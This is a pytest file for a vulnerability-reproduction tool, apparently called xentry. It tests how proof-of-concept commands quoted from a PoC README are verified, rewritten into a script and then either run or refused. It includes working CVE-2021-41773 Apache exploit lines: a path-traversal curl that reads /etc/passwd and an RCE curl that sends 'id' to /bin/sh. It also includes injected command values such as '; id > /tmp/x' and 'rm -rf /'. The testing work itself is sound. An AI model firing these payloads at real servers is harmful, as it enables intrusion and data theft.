"""A PoC that is a command rather than a file.

blasty's CVE-2021-41773 repository ships a Dockerfile, a compose file, four
vendored apache2 .debs and a config - and the exploit, which is a curl line in
the README. Refusing that as "no exploit" was wrong; running a command the
model wrote would be worse. The way through is that the command is QUOTED: it
arrives as an EvidenceRef and _verify_refs checks it appears verbatim in the
artifact, so the model can point at a command and cannot author one.
"""

from __future__ import annotations

import tarfile
from pathlib import Path
from typing import Any

import pytest

from tests.test_generic_target import _facts, _run
from xentry import generic
from xentry.models import EvidenceRef, Facts

CURL = (
    'curl -s --path-as-is "http://localhost:8080/icons/.%2e/%2e%2e/%2e%2e/'
    '%2e%2e/etc/passwd"'
)


def _command_facts(**overrides: Any) -> Facts:
    base: dict[str, Any] = {
        "poc_entrypoint": None,
        "poc_command": EvidenceRef(
            artifact_id="poc", sha256="a" * 64, quote=CURL, line_start=1, line_end=1
        ),
        "poc_command_target": "localhost:8080",
        "poc_command_read": "/etc/passwd",
    }
    base.update(overrides)
    return _facts(**base)


def test_the_command_becomes_a_script_the_run_step_already_knows_how_to_run() -> None:
    """run-poc-generic.sh dispatches on the extension - *.sh) runner=(bash) -
    and execs with target_ip, port and nonce_path as $1 $2 $3. So the two
    substitutions have somewhere to land, and they are spans of the quote
    rather than text anyone wrote."""
    script = generic.command_script(_command_facts())
    assert script.startswith("#!/bin/sh\n")
    assert "set -eu\n" in script
    body = script.strip().splitlines()[-1]
    assert body == (
        'curl -s --path-as-is "http://$1:$2/icons/.%2e/%2e%2e/%2e%2e/%2e%2e$3"'
    ), body
    # Bare, not quoted: both sit inside an argument the command already quoted.
    assert '"$1:$2"' not in body and '"$3"' not in body


def test_the_entrypoint_is_the_generated_script() -> None:
    """entrypoint() is the single place that decides what runs, so teaching it
    this case is what makes admission, the plan and the run step agree."""
    assert generic.entrypoint(_command_facts()) == "exploit.sh"
    assert generic.entrypoint(_command_facts()) == generic.COMMAND_ENTRYPOINT
    # A repository script still wins: a command is for when there is no file.
    both = _command_facts(poc_entrypoint="poc.py")
    assert generic.entrypoint(both) == "poc.py"
    assert generic.has_command(both) is False


@pytest.mark.parametrize(
    ("overrides", "expected"),
    [
        ({"poc_command_target": "localhost:9999"}, "target span"),
        ({"poc_command_read": "/etc/shadow"}, "disclosure span"),
        # Missing, not wrong: the message has to say the command names no
        # target at all, since that is what a README showing a raw HTTP
        # request produces and it is not a harness fault.
        ({"poc_command_target": None}, "names no target"),
        # Neither span, so there is no claim to prove.
        ({"poc_command_read": ""}, "exactly one of"),
        # Both spans: a run cannot prove two different things at once, and
        # which one it proved is what the record has to say.
        ({"poc_command_exec": "curl"}, "exactly one of"),
    ],
)
def test_a_span_that_is_not_in_the_command_is_refused(
    overrides: dict[str, Any], expected: str
) -> None:
    """The substitution is only checkable if the spans are really in the quote.
    A span that is not there would leave the command pointing at the PoC
    author's own localhost, and the job would exploit nothing and say so
    confusingly."""
    with pytest.raises(generic.NoObservable, match=expected):
        generic.command_script(_command_facts(**overrides))


def test_a_command_that_is_really_a_script_is_refused() -> None:
    multi = EvidenceRef(
        artifact_id="poc", sha256="a" * 64, quote="curl localhost:8080\nrm -rf /"
    )
    with pytest.raises(generic.NoObservable, match="refused command"):
        generic.command_script(_command_facts(poc_command=multi))
    long = EvidenceRef(
        artifact_id="poc", sha256="a" * 64, quote="curl localhost:8080 " + "x" * 2100
    )
    with pytest.raises(generic.NoObservable, match="refused command"):
        generic.command_script(_command_facts(poc_command=long))


def test_a_command_the_artifact_does_not_contain_is_dropped_not_used() -> None:
    """The safety argument, and the shape of the failure.

    An invented command must never be run - that part is absolute. But it is
    an OPTIONAL field, so failing to verify it has to cost the field and not
    the whole extraction: verifying it strictly turned a command the model had
    tidied into evidence_insufficient for the entire CVE. Dropped and the
    reason recorded, exactly as a citation that does not verify is, and the
    job then refuses for want of something to run - which is accurate.
    """
    from xentry.extract import ArtifactText, verify_facts

    text = f"Local file disclosure\n```\n$ {CURL}\n```\n"
    artifact = ArtifactText("poc", "b" * 64, text)
    evidence = [EvidenceRef(artifact_id="poc", sha256="b" * 64, quote="Local file disclosure")]
    good = _command_facts(
        poc_command=EvidenceRef(artifact_id="poc", sha256="b" * 64, quote=CURL),
        citations=list(evidence),
        # An unsourced affected range is refused on its own now, so the fixture
        # carries what a real reply carries.
        version_evidence=list(evidence),
    )
    verify_facts(good, [artifact])

    invented = _command_facts(
        version_evidence=list(evidence),
        poc_command=EvidenceRef(
            artifact_id="poc", sha256="b" * 64, quote="curl localhost:8080 ; id > /tmp/x"
        ),
        citations=[
            EvidenceRef(artifact_id="poc", sha256="b" * 64, quote="Local file disclosure")
        ],
    )
    verify_facts(invented, [artifact])
    # Dropped, so nothing downstream can run it...
    assert invented.poc_command is None
    assert generic.has_command(invented) is False
    # ...and the reason is kept as evidence rather than swallowed.
    assert invented.dropped_citations, invented.dropped_citations
    assert any("quote" in reason or "not" in reason for reason in invented.dropped_citations)
    # And with nothing to run, the job says that instead of inventing one.
    with pytest.raises(generic.NoObservable, match="does not name a file"):
        generic.entrypoint(invented)


def test_a_job_stages_the_generated_script_and_nothing_from_the_repository(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """End to end: the archive the broker is handed holds poc/exploit.sh, and
    the repository tarball is never fetched, because there is nothing in it to
    run."""
    _job, attempt_dir, broker = _run(tmp_path, _command_facts(), monkeypatch)
    archive = attempt_dir / "poc-generic.tar.gz"
    assert archive.is_file()
    with tarfile.open(archive) as handle:
        names = handle.getnames()
        assert names == ["poc/exploit.sh"], names
        member = handle.extractfile("poc/exploit.sh")
        assert member is not None
        assert b"$1:$2" in member.read()
    # The run step was told to run that file.
    assert broker.exec_params["run-poc-generic"]["entrypoint"] == "exploit.sh"


RCE = (
    "curl -s --path-as-is -d 'echo Content-Type: text/plain; echo; id' "
    '"http://localhost:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh"'
)


def _run_script(tmp_path: Path, facts: Facts) -> str:
    """Generate the script and actually run it, with curl replaced by a stub.

    The only way to know the nonce path really reaches the target: a $3 that
    does not expand sends the literal text "$3" and reads nothing, and that
    failure would look exactly like a CVE that did not reproduce.
    """
    import subprocess

    stub = tmp_path / "bin"
    stub.mkdir(parents=True, exist_ok=True)
    (stub / "curl").write_text('#!/bin/sh\nfor a in "$@"; do printf "ARG:%s\\n" "$a"; done\n')
    (stub / "curl").chmod(0o755)
    script = tmp_path / "exploit.sh"
    script.write_text(generic.command_script(facts))
    done = subprocess.run(
        ["sh", str(script), "10.0.0.9", "8080", "/var/lib/xentry/nonce"],
        capture_output=True, text=True, check=False,
        env={"PATH": f"{stub}:/usr/bin:/bin"},
    )
    assert done.returncode == 0, done.stderr
    assert "$3" not in done.stdout, "the literal text $3 reached the target"
    return done.stdout


def test_a_disclosure_carries_the_nonce_path(tmp_path: Path) -> None:
    out = _run_script(tmp_path, _command_facts())
    assert "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/var/lib/xentry/nonce" in out, out
    assert "Proof of disclosure" in generic.command_script(_command_facts())


def test_an_execution_carries_it_through_a_single_quoted_payload(tmp_path: Path) -> None:
    """The quoting trap. blasty's RCE line puts its payload in SINGLE quotes,
    where $3 does not expand - so the substitution has to close the quote,
    insert a double-quoted expansion and reopen it, which is the shell's own
    idiom. Without that the PoC sends "$3" to the target as text."""
    facts = _command_facts(
        poc_command=EvidenceRef(artifact_id="poc", sha256="a" * 64, quote=RCE),
        poc_command_read=None,
        poc_command_exec="id",
    )
    script = generic.command_script(facts)
    assert "Proof of execution" in script
    assert """cat '"$3"'""" in script, script
    out = _run_script(tmp_path, facts)
    assert "echo; cat /var/lib/xentry/nonce" in out, out


def test_a_bare_unquoted_span_is_quoted_when_substituted(tmp_path: Path) -> None:
    """A path can contain a space; an unquoted $3 would split into two words."""
    facts = _command_facts(
        poc_command=EvidenceRef(
            artifact_id="poc",
            sha256="a" * 64,
            quote="curl -s --path-as-is http://localhost:8080/a/../../etc/passwd",
        ),
    )
    assert '"$3"' in generic.command_script(facts)
    assert "/a/../../var/lib/xentry/nonce" in _run_script(tmp_path, facts)


def test_a_command_poc_is_offered_the_approval_it_needs() -> None:
    """The bug the operator hit on CVE-2021-41773.

    needs_a_download refused anything with no poc_entrypoint, a guard written
    before the command-only PoC existed. Once it did, blasty's repository - no
    script, a curl line, and a config that has to be placed - was refused as a
    flat 422 instead of being offered the card for that config. "Is there
    anything to run" is the question, and a quoted command is an answer.
    """
    needs = _command_facts(
        setup_packages=["apache2"], setup_units=["apache2"], ports=[80],
        place="apache-site", place_file="000-default.conf",
    )
    assert generic.has_command(needs) is True
    assert generic.admits(needs) is False
    assert generic.needs_a_download(needs) is True
    assert generic.admits(needs, artifact=True) is True
    # And with nothing to run at all it is still refused, which is the thing
    # the guard was for.
    nothing = _command_facts(poc_command=None, place="apache-site")
    assert generic.needs_a_download(nothing) is False


@pytest.mark.parametrize(
    ("path", "expected"),
    [
        ("000-default.conf", "https://raw.githubusercontent.com/o/r/HEAD/000-default.conf"),
        ("./000-default.conf", "https://raw.githubusercontent.com/o/r/HEAD/000-default.conf"),
        ("target/app.war", "https://raw.githubusercontent.com/o/r/HEAD/target/app.war"),
        ("../../etc/passwd", ""),
        ("/etc/passwd", ""),
        ("", ""),
    ],
)
def test_the_offered_file_comes_from_that_repository_only(path: str, expected: str) -> None:
    """A separator trick here would point the operator at someone else's
    repository and ask them to approve its bytes."""
    from xentry.fetch import poc_file_url

    assert poc_file_url("https://github.com/o/r", path) == expected


def test_a_file_from_the_pocs_own_repository_needs_no_approval(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """If the repository were malicious its exploit already is, and that runs
    either way - so a config beside it is no decision the operator has not
    made by submitting the URL.

    The consequence that matters as much: the check no longer stops at the
    placement refusal, so it reaches the archive lookup and the plan finally
    SHOWS the release it resolved. Before this, CVE-2021-41773 was refused at
    app.py:574 while release.resolve ran at app.py:620, and nothing on screen
    said Debian sid had been consulted at all.
    """
    from tests.test_url_approval import _app
    from xentry import sourcestore

    facts = _command_facts(
        setup_packages=["apache2"], setup_units=["apache2"], ports=[80],
        place="apache-site", place_file="000-default.conf",
    )
    client, app = _app(tmp_path, monkeypatch, facts)
    data_dir = tmp_path / "data"
    with client:
        client.get("/")
        result = client.post(
            "/api/links/check",
            json={
                "cve_url": "https://example.com/cve",
                "poc_url": "https://github.com/blasty/CVE-2021-41773",
            },
            headers={"X-Xentry-CSRF": app.state.token},
        )
    assert result.status_code == 200, result.json()
    body = result.json()
    # The placement gate is satisfied without a click: whatever this check now
    # says, it is no longer "it needs a file placed as apache-site".
    detail = body.get("detail") or ""
    assert "not vulnerable as packaged" not in detail, detail
    # And it got PAST that gate to the archive lookup, which is the visibility
    # fix: before this the check stopped at app.py:574 and release.resolve at
    # app.py:620 never ran, so nothing on screen named a release at all. Here
    # the fixture publishes no apache2, so the archive is what refuses - and it
    # says so, which is the whole point.
    assert "no built release publishes apache2" in detail, detail
    assert any("apt archive" in item["channel"] for item in body["channels"]), body
    # And the bytes are recorded, because the approval was never only a gate.
    held = sorted(
        name
        for name in sourcestore.load(data_dir, body["check_id"])
        if name.startswith("repo")
    )
    # Its own prefix: an operator approval replaces every "artifact", and a
    # file from the PoC's repository is not theirs to replace.
    assert held == ["repo0"], held


def test_a_refusal_says_what_the_extractor_could_not_back_up(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The diagnostic gap this whole round turned on.

    A poc_command whose quote does not verify is dropped - correctly, so one
    tidied command cannot fail a whole CVE. But the refusal that follows reads
    "the PoC text does not name a file that runs the exploit", which is true
    and silent about the command that WAS found and then rejected. Three CVEs
    were reported as mysterious because of it.
    """
    from tests.test_url_approval import POC_REPO, _app

    # The state verify_facts leaves behind when it drops an unverifiable
    # command: the command gone, the reason kept. (_app replaces `extract`, so
    # the drop itself is covered by the verify_facts test above.)
    facts = _command_facts(
        poc_command=None,
        dropped_citations=[
            (
                "citation quote not found in artifact poc: "
                "'curl -s --path-as-is http://localhost:8080/invented/by/the/model'"
            )
        ],
    )
    client, app = _app(tmp_path, monkeypatch, facts)
    with client:
        client.get("/")
        result = client.post(
            "/api/links/check",
            json={"cve_url": "https://example.com/cve", "poc_url": POC_REPO},
            headers={"X-Xentry-CSRF": app.state.token},
        )
    assert result.status_code == 422, result.json()
    detail = result.json()["detail"]
    assert "does not name a file that runs the exploit" in detail, detail
    # ...and now it also says what was dropped, and carries an id to quote.
    assert "could not back up" in detail, detail
    assert "invented/by/the/model" in detail, detail
    assert "no_observable [" in detail, detail
